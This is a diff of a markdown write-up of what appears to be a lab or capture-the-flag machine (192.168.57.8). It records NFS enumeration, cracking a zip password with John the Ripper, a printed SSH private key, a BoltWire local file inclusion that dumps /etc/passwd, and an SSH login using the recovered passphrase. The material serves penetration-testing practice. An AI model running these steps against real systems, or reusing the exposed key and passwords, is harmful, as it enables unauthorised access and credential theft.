@@ -129,17 +129,17 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ![Pasted image 20260820011431](../../assets/Pasted%20image%2020260820011431.png)
 
-##### Information Disclosure (when accessed admin account)
+##### Information Disclosure (when accessed through admin account)
 
 ![Pasted image 20260820011618](../../assets/Pasted%20image%2020260820011618.png)
 
-##### Restricted file upload capabilities as an admin or editor
+##### Restricted file upload capabilities as an admin or editor (good)
 
 ![Pasted image 20260820013333](../../assets/Pasted%20image%2020260820013333.png)
 
 ![Screenshot 2026-08-20 013355](../../assets/Screenshot%202026-08-20%20013355.png)
 
-##### Restrictions for uploading listed in Config section
+##### Restrictions for uploading listed in Config section (an allow-list, not a deny-list - good)
 
 ![Screenshot 2026-08-20 013725](../../assets/Screenshot%202026-08-20%20013725.png)
 
@@ -157,21 +157,223 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ![Pasted image 20260820000626](../../assets/Pasted%20image%2020260820000626.png)
 
+# RPC/NFS (111/2049)
+
+### via CLI
+
+#### access to encrypted zip file
+
+```
+┌──(root㉿kali)-[~]
+└─# showmount -e 192.168.57.8
+
+Export list for 192.168.57.8:
+/srv/nfs 172.16.0.0/12,10.0.0.0/8,192.168.0.0/16
+
+┌──(root㉿kali)-[/mnt/nfs]
+└─# ls
+
+save.zip
+
+┌──(root㉿kali)-[/mnt/nfs]
+└─# unzip save.zip       
+
+Archive:  save.zip
+[save.zip] id_rsa password: 
+```
+
+### via John The Ripper
+
+#### zip file password hash cracked with rockyou.txt (password: java101)
+
+```
+┌──(root㉿kali)-[/mnt/nfs]
+└─# zip2john save.zip > hash.txt
+
+ver 2.0 efh 5455 efh 7875 save.zip/id_rsa PKZIP Encr: TS_chk, cmplen=1435, decmplen=1876, crc=15E468E2 ts=2A0D cs=2a0d type=8
+ver 2.0 efh 5455 efh 7875 save.zip/todo.txt PKZIP Encr: TS_chk, cmplen=138, decmplen=164, crc=837FAA9E ts=2AA1 cs=2aa1 type=8
+NOTE: It is assumed that all files in each archive have the same password.
+If that is not the case, the hash may be uncrackable. To avoid this, use
+option -o to pick a file at a time.
+
+┌──(root㉿kali)-[/mnt/nfs]
+└─# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+No password hashes left to crack (see FAQ)
+
+┌──(root㉿kali)-[/mnt/nfs]
+└─# john hash.txt --show                                     
+
+save.zip:java101::save.zip:todo.txt, id_rsa:save.zip
+
+1 password hash cracked, 0 left
+```
+
+### via CLI
+
+#### SSH Private Key and employee's To-Do list in save.zip
+
+```
+┌──(root㉿kali)-[/mnt/nfs]
+└─# unzip save.zip 
+
+Archive:  save.zip
+[save.zip] id_rsa password: 
+  inflating: id_rsa                  
+  inflating: todo.txt
+
+┌──(root㉿kali)-[/mnt/nfs]
+└─# cat todo.txt 
+
+- Figure out how to install the main website properly, the config file seems correct...
+- Update development website
+- Keep coding in Java because it's awesome
+
+jp
+
+┌──(root㉿kali)-[/mnt/nfs]
+└─# cat id_rsa  
+
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDVFCI+ea
+0xYnmZX4CmL9ZbAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQC/kR5x49E4
+0gkpiTPjvLVnuS3POptOks9qC3uiacuyX33vQBHcJ+vEFzkbkgvtO3RRQodNTfTEB181Pj
+3AyGSJeQu6omZha8fVHh/y2ZMRjAWRs+2nsT1Z/JONKNWMYEqQKSuhBLsMzhkUEEbw3WLq
+S0kiHCk/0VnPZ8EdMCsMGdj2MUm+ccr0GZySFg5SAJzJw2BGnjFSS+dERxb7e9tSLgDv4n
+Wg7fWw2dcG956mh1ZrPau7Gc1hFHQLLUHPgXx3Xp0f5/pGzkk6JACzCKIQj0Qo3ueb6JSC
+xWgwn6ey6XywTi9i7TdfFyCSiFW//jkeczyaQOxI/hyqYfLeiRB3AAAD0PHU/4RN8f2HUG
+ks1NM9+C9B+Fpn+nGjRj6/53m3HoBaUb/JZyvUvOXNoYnxNKIxHP5r4ytsd8X8xp5zTpi1
+tNmTeoB1kyoi2Uh70yPo4M6VlNupSeCzMQIYs/Wqya4ycyv1/yhGAPTZg8ARqop/RTQJtI
+EYVDbTxKxr7JGBfaBPiFWdUIKlN1yBXWMRrIs3SBoOaQ/n+CZKQ65mMFRs4VwqpUsRJ8y7
+ZoLZIfwaunV5f10PsCR8rp/2g563gK0bu+iVUqeo+kJMtFN7yEj2OaO6N/EdO4x/LVhqjY
+SPZD6w23mPp2I693oop1VpITsHV2talK1lLvS239gU45J4VlxFtcLjRlSAhc1ktnHw1e4u
+dRZ68JW0z2S4Y8q4EO/H4kGlZsyaf6oLCspGW1YQPhDJ2v6KkgRXyFb3tvo617yGEcBzzh
+wrVuEXObOc+zDOYgw1a/1x1pzK5vGQWaUOjN2FEz+vnSPTX3cbgUkLh3ZshuVzov0Rx7i+
+AM0CNiXVmgCGdLg0yBIv8lFIjYxswxTRkNzKYSagEZQNFCf+0H1cZcXKCK8z9a2NvBkQ/b
+rGvuoZuIjGqGvMP3Ifdma7PsG3A8GNOgWnl9YuMgc4r2WulsQVLVEJGIJjap71oNwGCUud
+T1Ou2tVn7Cf0T/NmuRmh7VUkTagDMf3u5X+UIST5Sv8y2y9jgR4x92ZL+AY968Pif1devc
+753z+GL7eWfbNqd+TJfxPdh82EqE5cmN/jYOKc0D1MC2zVChNCVWQYf4uVQ0L/XOXQXnFT
+hWdHfnf/SXos28dSM7Kx6B3jmeZQ60vk0Apas0D9gLz5xZ9GCb0Dwwka4dBSw57cwBbB3E
+PKXqJFks2ZnkyVL1W8u6ovnkpcqQz1mxr42zdC52Jc30NYww7H2G7v7FYKtf6tEyzeXG2+
+rcZwO4evWbV158rzrA4ibsGRn8+PM86LI/7T5/Y5pc2T+TAaDjKLRZ0Dtv5nMvHpigqDu4
++e/eQk9dTmMPv9jbqcHeRo7N/Q8EC4vtXj/pCPydB5lYw/GMb8Bq5opXzADx0n4zDLtGDC
+LHcAIF6FMa+kLQHKvG1fDIK2xpLz+HxYCYTS/UAVRtWAdzQ29uG8zFAopGoQGbNA+caq7z
+iLUBEWHXJktNenIrfF3rqB3m8SNyNIn+MQS3LIakhlHAqXMIWU2pQE/0tF+V8xuKRpZvw/
+gdhLfAhm2gZMQzOe1cXWhKmtEQUntPdPAyfOTZcUtcs/pKNEjNTz5YnhQqnDbAh5x46UgZ
+q4xpWBvdz0v8qwF6LXLdPBEcT4TOg=
+-----END OPENSSH PRIVATE KEY-----
+```
+
+---
+
+# -- Version Research (Potential Vulnerabilities) --
+
+### via SearchSploit
+
+#### Apache 2.4.38
+
+```
+┌──(root㉿kali)-[/home/kali]
+└─# searchsploit apache 2
+```
+
+```
+Apache 2.4.17 < 2.4.38 - 'apache2ctl graceful' 'logrotate' Local Privilege Escalation
+```
+
+#### BoltWire 6.03
+
+```
+┌──(root㉿kali)-[~]
+└─# searchsploit boltwire
+```
+
+```
+BoltWire 6.03 - Local File Inclusion
+```
+
+![](../../../Pasted%20image%2020260821183859.png)
+### via Browser
+
+#### Apache 2.4.38
+
+![](../../../Pasted%20image%2020260821183227.png)
+
+#### BoltWire 6.03
+
+##### Local File Inclusion - applied
+
+![](../../../Pasted%20image%2020260821184108.png)
+
+```
+root:x:0:0:root:/root:/bin/bash  
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin  
+bin:x:2:2:bin:/bin:/usr/sbin/nologin  
+sys:x:3:3:sys:/dev:/usr/sbin/nologin  
+sync:x:4:65534:sync:/bin:/bin/sync  
+games:x:5:60:games:/usr/games:/usr/sbin/nologin  
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin  
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin  
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin  
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin  
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin  
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin  
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin  
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin  
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin  
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin  
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin  
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin  
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin  
+systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin  
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin  
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin  
+messagebus:x:104:110::/nonexistent:/usr/sbin/nologin  
+sshd:x:105:65534::/run/sshd:/usr/sbin/nologin  
+jeanpaul:x:1000:1000:jeanpaul,,,:/home/jeanpaul:/bin/bash  
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin  
+mysql:x:106:113:MySQL Server,,,:/nonexistent:/bin/false  
+_rpc:x:107:65534::/run/rpcbind:/usr/sbin/nologin  
+statd:x:108:65534::/var/lib/nfs:/usr/sbin/nologin
+```
+
 ---
 
 # -- Exploitation --
 
-### via TOOL
+### via common sense
+
+**The id_rsa in archive available via NFS - passwordless ssh connection;
+Username? someone who signs as `-jp`;
+`jp@192.168.57.8` doesn't work;
+Local File Inclusion exploit on BoltWire web server -> list of usernames;
+one of the usernames -> jeanpaul (matches jp);
+attempt on `jeanpaul@192.168.57.8` works, but requires a passphrase;
+previously gathered passwords: `java101`, `I_love_java`;
+`java101` -> fail, `I_love_java` -> successful login**
+
+### via CLI
 
 ```
-┌──(root㉿kali)-[/home/kali]
-└─# command if needed
-```
+┌──(root㉿kali)-[~]
+└─# ssh jeanpaul@192.168.57.8
 
-#### Info: ...
+Enter passphrase for key '/root/.ssh/id_rsa': *I_love_java* (hidden)
 
-```
-paste text or screenshot
+Linux dev 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Fri Aug 21 14:06:32 2026 from 192.168.57.4
+
+jeanpaul@dev:~$ whoami
+jeanpaul
 ```
 
 ---
